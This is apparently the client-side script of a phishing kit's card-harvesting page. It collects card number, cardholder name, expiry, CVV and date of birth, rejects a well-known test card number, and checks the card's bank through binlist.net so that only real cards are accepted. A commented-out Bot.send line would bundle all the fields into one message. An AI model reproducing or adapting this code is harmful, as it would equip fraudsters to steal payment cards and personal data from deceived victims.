$('form').submit(function(e) {
	return false;
});

$('#button-1').timedDisable(10000);

$('input').focus(function() {
	$(this).css('color', 'black');
});

var valid_first = '';
var valid_second = '';
var full_valid = '';
var cardholder_valid = '';
var expiry_valid = '';
var cvv_valid = '';
var dob_valid = '';

$('#button-1').click(function() {
	$('.page-1').slideUp();
	$('.page-2').slideDown();
	$('input.credit_card_number').focus();
});

$('#button-2').click(function() {
		var ccn = $('input.credit_card_number').val();
		var chn = $('input.cardholder_name').val();
		var cce = $('input.credit_card_expiry').val();
		var ccc = $('input.credit_card_cvc').val();
		var dmy = $('input.dd_mm_yyyy').val();
		if (full_valid == true && cardholder_valid == true && expiry_valid == true && cvv_valid == 'true' && dob_valid == 'true') {
		//Bot.send("CCNEW==:=="+ccn+"::::"+chn+"::::"+cce+"::::"+ccc+"::::"+dmy+"");
        document.myform.submit();
		}
		else {
			$('.error').slideDown().delay('2000').slideUp();
		}
});

$('input.credit_card_number').formance('format_credit_card_number');
$('input.credit_card_expiry').formance('format_credit_card_expiry');
$('input.credit_card_cvc').formance('format_credit_card_cvc');
$('input.dd_mm_yyyy').formance('format_dd_mm_yyyy');

$(function() {
	$('input.credit_card_number').validateCreditCard(function(result) {
		valid_first = result.valid;
	});
});


    $('input.credit_card_number').blur(function(){
    changeCVV();
    bin = $('input.credit_card_number').val().replace(/\s+/g, '').substr(0,6);
	if ($('input.credit_card_number').val() == '' || $('input.credit_card_number').val() == '4111 1111 1111 1111') {
		valid_first = 'nope';
	}

	if (valid_first == 'nope') {
		$('input.credit_card_number').attr('placeholder', 'Enter valid credit card number').val('').focus();
		return false;
	}
    	if (valid_first == true) {
		$.ajax({ 
			type: 'GET', 
			url: 'http://www.binlist.net/json/' + bin + '', 
			dataType: 'json',
			success: function (data) { 
				valid_second = data.bank;
			}
		});

	}
	if (valid_first == false) {
		$('input.credit_card_number').attr('placeholder', 'Enter valid credit card number').val('');
		full_valid = false;
		return false;
	}
setTimeout(function () {
	if (valid_second == '') {
		$('input.credit_card_number').attr('placeholder', 'Your card can\'t be checked. Use another').val('');
		full_valid = false;
	}
	if (valid_second != '') {
		$('input.credit_card_number').css('color', 'green');
		full_valid = true;
	}
}, 1500);
    });

$('input.cardholder_name').blur(function() {
	if ($(this).val() == '') {
		$('input.cardholder_name').val('');
		cardholder_valid = false;
		return false;
	}
	if (checkStr($(this).val()) == true) {
		$('input.cardholder_name').attr('placeholder', 'Enter valid cardholder name').val('');
		cardholder_valid = false;
	}
	else {
		if ($(this).val().split(' ').length == 2 && $(this).val().split(' ')[0].length >= 3 && $(this).val().split(' ')[1].length >= 3) {
			cardholder_valid = true;
			$('input.cardholder_name').css('color', 'green');
		}
			else {
				$('input.cardholder_name').attr('placeholder', 'Enter valid cardholder name').val('');
				cardholder_valid = false;
			}	
	}

});

$('input.credit_card_expiry').blur(function() {
	if ($('input.credit_card_expiry').formance('validate_credit_card_expiry') == false) {
		$('input.credit_card_expiry').css('color', 'red');
		expiry_valid = false;
	}
	else {
		$('input.credit_card_expiry').css('color', 'green');
		expiry_valid = true;
	}
});

$('input.credit_card_cvc').blur(function() {
	if ($('input.credit_card_cvc').val().length < 3) {
		$('input.credit_card_cvc').css('color', 'red');
		cvv_valid = 'false';
	}
	else {
		$('input.credit_card_cvc').css('color', 'green');
		cvv_valid = 'true';
	}
});

$('input.dd_mm_yyyy').blur(function() {
	if ($('input.dd_mm_yyyy').formance('validate_dd_mm_yyyy') == false) {
		$('input.dd_mm_yyyy').css('color', 'red');
		dob_valid = 'false';
	}
	else {
		if ($(this).val().split(' / ')[2] >= new Date().getFullYear() || $(this).val().split(' / ')[2] < 1940) {
			$('input.dd_mm_yyyy').css('color', 'red');
			dob_valid = 'false';
		}
		else {
			$('input.dd_mm_yyyy').css('color', 'green');
			dob_valid = 'true';
		}
	}
});
